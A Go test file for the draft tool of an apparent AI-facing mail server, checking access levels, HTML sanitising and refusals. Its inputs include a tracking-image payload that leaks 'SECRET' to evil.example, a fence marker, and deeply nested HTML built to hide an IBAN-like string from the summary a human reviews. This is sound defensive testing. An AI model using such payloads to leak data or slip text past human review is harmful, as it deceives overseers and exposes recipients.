// SPDX-FileCopyrightText: 2026 Martin <dev@amsys.cz>
// SPDX-License-Identifier: MIT

package tools

import (
	"context"
	"errors"
	"slices"
	"strings"
	"testing"

	"github.com/amsys/mailbag-mcp/internal/guard"
)

// TestDraft_SavesAndNeedsDraftAccess holds the access mapping of the
// draft tool (D5.1). A read account gets ErrAccessDenied and the
// mailbox sees no write. A draft account and a send account both
// save the message, and the draft tool never sends at either level.
// A wrong mapping here lets a read-only account compose mail and
// nothing else turns red.
//
// The test also checks that the saved message holds the caller's
// text, that the draft id comes back, and that only the account below
// the send level gets the note that names the fix (§3.17). The last
// check holds I5 for the send group: the "send" toolset lists both
// tools, so Registry.Disable removes draft with send.
//
// arch: D5.1, D10.3
func TestDraft_SavesAndNeedsDraftAccess(t *testing.T) {
	in := DraftIn{
		Account: "work",
		To:      []string{"ann@example.test"},
		Subject: "quarter close",
		Body:    "the numbers are in",
	}
	for _, tc := range []struct {
		level    guard.Level
		denied   bool
		wantNote bool
	}{
		{level: guard.LevelRead, denied: true},
		{level: guard.LevelDraft, wantNote: true},
		{level: guard.LevelSend},
	} {
		t.Run(string(tc.level), func(t *testing.T) {
			h, prov := draftFixture(t, nil)
			h.mail.(*writeMail).acct.Access = string(tc.level)

			out, err := h.handle(context.Background(), in)

			if len(prov.sent) != 0 || len(prov.sentDrafts) != 0 {
				t.Fatalf("access=%s: the draft tool sent mail", tc.level)
			}
			if tc.denied {
				if !errors.Is(err, guard.ErrAccessDenied) {
					t.Fatalf("access=%s: err = %v, want ErrAccessDenied", tc.level, err)
				}
				if len(prov.drafts) != 0 {
					t.Errorf("access=%s: SaveDraft ran before the refusal", tc.level)
				}
				return
			}
			if err != nil {
				t.Fatalf("access=%s: %v", tc.level, err)
			}
			if len(prov.drafts) != 1 {
				t.Fatalf("access=%s: SaveDraft ran %d times, want 1", tc.level, len(prov.drafts))
			}
			m := prov.drafts[0]
			if m.Subject != in.Subject || m.Text != in.Body || !slices.Equal(m.To, in.To) {
				t.Errorf("access=%s: saved message = %+v, want the caller's text", tc.level, m)
			}
			if out.Account != "work" || out.DraftID != prov.draftID {
				t.Errorf("access=%s: result = %+v, want account work and draft id %q", tc.level, out, prov.draftID)
			}
			hasNote := strings.Contains(out.Note, `access = "send"`)
			if hasNote != tc.wantNote {
				t.Errorf("access=%s: note = %q, want a note that names the fix: %v", tc.level, out.Note, tc.wantNote)
			}
		})
	}

	var group []string
	for _, g := range Toolsets() {
		if g.Name == "send" {
			group = g.Tools
		}
	}
	if !slices.Equal(group, []string{"draft", "send"}) {
		t.Errorf("the send toolset lists %v, want [draft send] (D5.1, I5)", group)
	}
}

// TestDraft_HTMLCutToAllowlist holds D5.5 on the draft side: the html
// field goes through mime.AllowHTML before the message is built. The
// saved HTML holds no remote image, no style and no comment, and the
// note says how many items went. HTML that is already clean stays as
// it is and gives no note. A fence marker still leaves the HTML (M14).
//
// arch: D5.5, D5.2
func TestDraft_HTMLCutToAllowlist(t *testing.T) {
	t.Run("cut", func(t *testing.T) {
		h, prov := draftFixture(t, nil)
		out, err := h.handle(context.Background(), DraftIn{
			Account: "work",
			To:      []string{"ann@example.test"},
			HTML: `<p style="color:#fff">See you at lunch.</p><img src="https://evil.example/p.gif?d=SECRET">` +
				`<!-- note --><a href="https://ok.example/" onclick="f()">menu</a> [UNTRUSTED_BODY]`,
		})
		if err != nil {
			t.Fatalf("draft: %v", err)
		}
		if len(prov.drafts) != 1 {
			t.Fatalf("SaveDraft ran %d times, want 1", len(prov.drafts))
		}
		// guard.StripFenceMarkers removes the marker head only (M14).
		want := `<p>See you at lunch.</p><a href="https://ok.example/">menu</a> BODY]`
		got := prov.drafts[0].HTML
		if got != want {
			t.Errorf("saved html = %q, want %q", got, want)
		}
		if fenceMarkerPattern.MatchString(got) {
			t.Errorf("saved html %q holds a fence marker (M14)", got)
		}
		if !strings.Contains(out.Note, "4 items removed from html") {
			t.Errorf("note = %q, want the count of 4 removed items", out.Note)
		}
		if strings.Contains(out.Note, `access = "send"`) {
			t.Errorf("note = %q names the send fix for a send account", out.Note)
		}
	})

	t.Run("clean stays", func(t *testing.T) {
		h, prov := draftFixture(t, nil)
		html := `<p>Hi <b>Ann</b>,<br>see <a href="mailto:bob@example.test">Bob</a>.</p>`
		out, err := h.handle(context.Background(), DraftIn{Account: "work", To: []string{"ann@example.test"}, HTML: html})
		if err != nil {
			t.Fatalf("draft: %v", err)
		}
		if got := prov.drafts[0].HTML; got != html {
			t.Errorf("saved html = %q, want %q", got, html)
		}
		if out.Note != "" {
			t.Errorf("note = %q, want none", out.Note)
		}
	})

	t.Run("draft account gets both notes", func(t *testing.T) {
		h, _ := draftFixture(t, nil)
		h.mail.(*writeMail).acct.Access = string(guard.LevelDraft)
		out, err := h.handle(context.Background(), DraftIn{Account: "work", To: []string{"ann@example.test"}, HTML: `<div>x</div>`})
		if err != nil {
			t.Fatalf("draft: %v", err)
		}
		if !strings.Contains(out.Note, "1 items removed from html") || !strings.Contains(out.Note, `access = "send"`) {
			t.Errorf("note = %q, want the cut note and the send fix", out.Note)
		}
	})
}

// TestDraft_RefusesDeepNest holds the R1D-fix-judge.md finding 1 fix
// on the draft side. AllowHTML keeps an allowlist element at any nest
// depth (D5.5), but the send summary's text view (mime.HTMLToText)
// stops after a fixed stack depth, so text past that point would
// leave with no line shown to the human (I8). A draft whose clean
// html holds such a nest is refused before SaveDraft runs, with a
// fixed error that tells the model to use less nesting, and the
// provider sees no draft. A normal, shallow, allowlisted draft still
// saves (no false refusal).
//
// arch: D5.5, D5.2, I8
func TestDraft_RefusesDeepNest(t *testing.T) {
	cases := []struct {
		name string
		html string
	}{
		{name: "bold wrap", html: "<p>See you at lunch.</p>" + strings.Repeat("<b>", 300) + "JUDGE-SECRET-IBAN-DE00" + strings.Repeat("</b>", 300)},
		{name: "list wrap", html: strings.Repeat("<ul><li>", 150) + "JUDGE-SECRET-IBAN-DE00" + strings.Repeat("</li></ul>", 150)},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			h, prov := draftFixture(t, nil)
			out, err := h.handle(context.Background(), DraftIn{
				Account: "work",
				To:      []string{"ann@example.test"},
				HTML:    tc.html,
			})
			if !errors.Is(err, errHTMLNested) {
				t.Fatalf("err = %v, want errHTMLNested %q", err, errHTMLNested)
			}
			if out != (DraftOut{}) {
				t.Errorf("out = %+v, want the zero value", out)
			}
			if len(prov.drafts) != 0 {
				t.Errorf("SaveDraft ran %d times, want 0", len(prov.drafts))
			}
		})
	}

	t.Run("shallow allowlisted html still saves", func(t *testing.T) {
		h, prov := draftFixture(t, nil)
		html := "<p>See you at lunch.</p>" + strings.Repeat("<b>", 5) + "hi" + strings.Repeat("</b>", 5)
		out, err := h.handle(context.Background(), DraftIn{Account: "work", To: []string{"ann@example.test"}, HTML: html})
		if err != nil {
			t.Fatalf("draft: %v", err)
		}
		if len(prov.drafts) != 1 {
			t.Fatalf("SaveDraft ran %d times, want 1", len(prov.drafts))
		}
		if got := prov.drafts[0].HTML; got != html {
			t.Errorf("saved html = %q, want %q", got, html)
		}
		if out.DraftID == "" {
			t.Errorf("out = %+v, want a draft id", out)
		}
	})
}

// TestDraft_HTMLCutToNothingHasNoContent holds R16-L4: the content
// check runs on the html field after the allowlist cut. An html field
// that the cut empties, with draft_id and no other content, is refused
// before SaveDraft, so the stored draft is not replaced with an empty
// one.
//
// arch: D5.1, D5.5, R16-L4
func TestDraft_HTMLCutToNothingHasNoContent(t *testing.T) {
	h, prov := draftFixture(t, nil)
	_, err := h.handle(context.Background(), DraftIn{
		Account: "work",
		HTML:    `<img src="https://evil.example/p.gif">`,
		DraftID: "1700000000.7.Drafts",
	})
	if err == nil || !strings.Contains(err.Error(), "the draft has no content") {
		t.Fatalf("err = %v, want the no-content refusal", err)
	}
	if len(prov.drafts) != 0 {
		t.Errorf("SaveDraft ran %d times (replace %v), want 0", len(prov.drafts), prov.replaced)
	}
}
